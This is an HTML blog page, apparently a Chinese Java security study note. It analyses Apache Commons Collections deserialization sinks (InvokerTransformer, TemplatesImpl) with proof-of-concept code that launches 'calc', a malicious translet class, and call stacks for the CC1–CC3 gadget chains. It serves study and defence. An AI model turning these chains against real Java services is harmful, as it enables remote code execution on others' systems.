@@ -1,0 +1,1042 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Sink点InvokerTransformer利用点测试代码Runtime r &#x3D; Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);  命令执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化漏洞">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="Sink点InvokerTransformer利用点测试代码Runtime r &#x3D; Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);  命令执">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163731953.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163753455.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114211358.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112003177.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112134204.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114943384.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115148208.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115329007.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113058486.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113708991.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201123433614.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201124139890.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/d1e330174cca50820a42e99a8b521c44.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231214101909320.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181256628.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181150542.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161437135.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161529181.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161645365.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213182843785.png">
+<meta property="article:published_time" content="2024-01-19T10:14:15.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.743Z">
+<meta property="article:author" content="pacemrc">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163731953.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>反序列化漏洞 - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="反序列化漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-19 18:14" pubdate>
+          2024年1月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">反序列化漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Sink点"><a href="#Sink点" class="headerlink" title="Sink点"></a>Sink点</h1><h2 id="InvokerTransformer利用点"><a href="#InvokerTransformer利用点" class="headerlink" title="InvokerTransformer利用点"></a>InvokerTransformer利用点</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span> r = <span class="hljs-keyword">Runtime</span>.getRuntime();
+<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);</code></pre></div>
+
+<h3 id="命令执行分析"><a href="#命令执行分析" class="headerlink" title="命令执行分析"></a>命令执行分析</h3><p>查看<code>org.apache.commons.collections.functors.InvokerTransformer#InvokerTransformer(java.lang.String, java.lang.Class[], java.lang.Object[])</code>构造方法</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163731953.png" srcset="/img/loading.gif" lazyload> </p>
+<p>首先创建一个<code>InvokerTransformer</code>对象，可为其提供方法名，参数类型，参数值</p>
+<p>再查看<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>方法，方法内部获取传入对象的类，在获取指定名称的方法，在反射调用该方法</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163753455.png" srcset="/img/loading.gif" lazyload> </p>
+<p><strong>可见该利用点是通过反射进行命令执行</strong></p>
+<h2 id="TemplatesImpl利用点"><a href="#TemplatesImpl利用点" class="headerlink" title="TemplatesImpl利用点"></a>TemplatesImpl利用点</h2><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>Java的类加载是通过java.lang.ClassLoader#loadClass(java.lang.String)方法实现的，defineClass方法允许从字节数据中还原一个类，由于java.lang.ClassLoader类的defineClass方法是私有或保护的，这在一定程度上难以利用。</p>
+<p>在TemplatesImpl类中，其内部类TransletClassLoader继承了ClassLoader并重写了loadClass和defineClass方法，该利用点就是围绕着defineClass方法传入恶意字节数据来进行类加载进而执行命令</p>
+<h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><p>Calc.java</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+    <span class="hljs-keyword">static</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;
+</code></pre></div>
+
+<p>test.java</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;
+<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(Calc.class);
+        <span class="hljs-type">byte</span>[] code = javaClass.getBytes();
+        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);
+        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);
+        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+        obj.newTransformer();
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="命令执行分析-1"><a href="#命令执行分析-1" class="headerlink" title="命令执行分析"></a>命令执行分析</h3><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>方法内的newInstance()代码位置下断点</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114211358.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112003177.png" srcset="/img/loading.gif" lazyload> </p>
+<p>进入newTransformer()方法，首先使用TransformerImpl类的有参构造方法创建一个对象</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112134204.png" srcset="/img/loading.gif" lazyload> </p>
+<p>查看该构造方法，第一个参数为AbstractTranslet类的实例对象，可知getTransletInstance()方法大概为创建一个AbstractTranslet类的实例对象</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114943384.png" srcset="/img/loading.gif" lazyload>  </p>
+<p>进入getTransletInstance()方法，当<code>_name</code>字段为空时返回，当<code>_class</code>字段不为空时，执行<code>defineTransletClasses()</code>方法</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115148208.png" srcset="/img/loading.gif" lazyload> </p>
+<p>  进入<code>defineTransletClasses()</code>方法，当<code>_bytecodes</code>字段为空时，抛异常；往下进行访问权限的校验，需要用到<code>_tfactory</code>字段，该字段为<code>private transient TransformerFactoryImpl _tfactory = null;</code>对象</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115329007.png" srcset="/img/loading.gif" lazyload> </p>
+<p>在getTransletInstance()方法中，判断<code>_name</code>字段是否为空，为空则返回，在判断<code>_class</code>字段是否为空，不为空进入<code>defineTransletClasses()</code>方法，跟随调用链进入该方法</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113058486.png" srcset="/img/loading.gif" lazyload> </p>
+<p>在<code>defineTransletClasses()</code>方法中，判断<code>_bytecodes</code>字段是否为空，为空则抛出异常，然后再做访问控制的校验，需要用到<code>_tfactory</code>字段</p>
+<blockquote>
+<p>_bytecodes字段为二维字节数组：private byte[][] _bytecodes;</p>
+</blockquote>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113708991.png" srcset="/img/loading.gif" lazyload> </p>
+<p>接下对传入的<code>_bytecodes</code>数据解析，调用<code>defineClass()</code>方法从字节数据中加载类，并判断该类是否实现了<code>AbstractTransletImpl</code>抽象类</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201123433614.png" srcset="/img/loading.gif" lazyload> </p>
+<p>最后来到<code>newInstance()</code>方法创建实例，<strong>可知命令执行是在创建实例对象过程中执行了静态代码块</strong></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201124139890.png" srcset="/img/loading.gif" lazyload> </p>
+<h3 id="恶意类构造"><a href="#恶意类构造" class="headerlink" title="恶意类构造"></a>恶意类构造</h3><p>经上面的分析，可知</p>
+<ol>
+<li><p>在从字节数据中加载类后会判断类的超类是否为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet抽象类，所以恶意类需要实现该抽象类。</p>
+</li>
+<li><p>加载到恶意类对象后会调用<code>newInsance()</code>方法创建对象，由此我们可以在恶意类内加入静态代码块或构造代码块来实现类加载时执行恶意代码。</p>
+</li>
+<li><p>该类最好不属于任何包。</p>
+</li>
+</ol>
+<p>实例</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+    
+    <span class="hljs-keyword">static</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span>&#123;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;
+</code></pre></div>
+
+<h3 id="构造字节码数据"><a href="#构造字节码数据" class="headerlink" title="构造字节码数据"></a>构造字节码数据</h3><div class="code-wrapper"><pre><code class="hljs abnf">JavaClass javaClass <span class="hljs-operator">=</span> Repository.lookupClass(Calc.class)<span class="hljs-comment">;</span>
+byte[] code <span class="hljs-operator">=</span> javaClass.getBytes()<span class="hljs-comment">;</span></code></pre></div>
+
+<h1 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h1><p>CC1-CC7反序列化链就是利用了上述两个sink点，与不同的readObject入口拼接来达到命令执行效果</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/d1e330174cca50820a42e99a8b521c44.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)
+<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-meta"> [2]</span>
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">checkSetValue</span>:<span class="hljs-number">204</span>, TransformedMap (org.apache.commons.collections.map)
+<span class="hljs-attribute">setValue</span>:<span class="hljs-number">192</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)
+<span class="hljs-attribute">readObject</span>:<span class="hljs-number">451</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">exec:</span><span class="hljs-number">347</span>, Runtime (java.lang)
+<span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">497</span>, Method (java.lang.reflect)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+<span class="hljs-symbol">get:</span><span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)
+<span class="hljs-symbol">entrySet:</span><span class="hljs-number">-1</span>, $Proxy0 (<span class="hljs-keyword">com</span>.sun.proxy)
+<span class="hljs-symbol">readObject:</span><span class="hljs-number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div>
+
+<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)
+<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="hljs-number">2</span>]
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">497</span>, Method (java.lang.reflect)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)
+<span class="hljs-symbol">compare:</span><span class="hljs-number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)
+<span class="hljs-symbol">siftDownUsingComparator:</span><span class="hljs-number">721</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">siftDown:</span><span class="hljs-number">687</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">heapify:</span><span class="hljs-number">736</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">readObject:</span><span class="hljs-number">795</span>, PriorityQueue (java.util)</code></pre></div>
+
+<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>有多种组装方式</p>
+<div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)
+<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+&lt;init&gt;:<span class="hljs-number">64</span>, TrAXFilter (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">newInstance0:</span><span class="hljs-number">-1</span>, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">62</span>, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">422</span>, Constructor (java.lang.reflect)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">106</span>, InstantiateTransformer (org.apache.commons.collections.functors)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+<span class="hljs-symbol">get:</span><span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)
+<span class="hljs-symbol">invoke:</span><span class="hljs-number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)
+<span class="hljs-symbol">entrySet:</span><span class="hljs-number">-1</span>, $Proxy0 (<span class="hljs-keyword">com</span>.sun.proxy)
